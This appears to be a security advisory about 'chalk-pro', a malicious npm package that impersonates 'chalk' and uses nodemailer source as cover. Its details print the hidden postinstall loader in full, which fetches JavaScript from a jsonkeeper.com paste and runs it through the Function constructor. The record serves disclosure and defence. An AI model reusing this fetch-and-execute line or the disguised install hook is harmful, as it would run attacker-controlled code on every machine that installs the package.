summary: chalk-pro postinstall fetches and executes remote code from jsonkeeper.com
details: Package name 'chalk-pro' impersonates the popular 'chalk' package but ships nodemailer source as cover (main is lib/nodemailer.js, description field reads 'Copyright (c) React Training 2015-present'). package.json declares a postinstall hook ("postinstall": "node lib/utils/index.js") that spawns a detached child process running lib/utils/smtp-connection/index.js. That file performs `require("axios").get("https://jsonkeeper.com/b/8LJHY").then(r => new Function("require", r.data.cookie)(require))` — fetching JavaScript from an anonymous, mutable JSON-paste host and executing it via the Function constructor with the real `require` injected. The fetched payload runs with full Node privileges on every machine that installs the package, with no signature, no pin, and no integrity check. The remote source is attacker-controlled and can be swapped at any time.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
